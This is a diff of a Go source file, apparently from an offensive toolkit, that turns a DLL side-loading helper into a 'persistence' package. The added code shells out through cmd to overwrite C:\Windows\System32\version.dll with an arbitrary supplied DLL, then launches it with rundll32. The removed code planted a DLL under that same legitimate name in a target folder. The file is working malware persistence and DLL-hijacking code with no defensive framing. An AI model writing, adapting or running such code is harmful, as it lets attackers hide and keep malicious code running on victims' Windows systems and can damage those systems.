@@ -1,22 +1,25 @@
-package windows
+//go:build windows
+
+package persistence
 
 import (
-"os"
-"path/filepath"
+"os/exec"
 )
 
-type DLLSideload struct{}
-
-func NewDLLSideload() *DLLSideload {
-return &DLLSideload{}
-}
-
-func (d *DLLSideload) Sideload(dllPath, targetPath string) error {
-// Copy DLL to target folder with legitimate name
-dest := filepath.Join(targetPath, "version.dll")
-data, err := os.ReadFile(dllPath)
+func DLLSideload(dllPath string) bool {
+cmd := exec.Command("cmd", "/c", "copy "+dllPath+" C:\\Windows\\System32\\version.dll /y")
+err := cmd.Run()
 if err != nil {
-return err
+return false
 }
-return os.WriteFile(dest, data, 0644)
+return true
+}
+
+func DLLSideloadExec() bool {
+cmd := exec.Command("cmd", "/c", "rundll32.exe C:\\Windows\\System32\\version.dll,Start")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
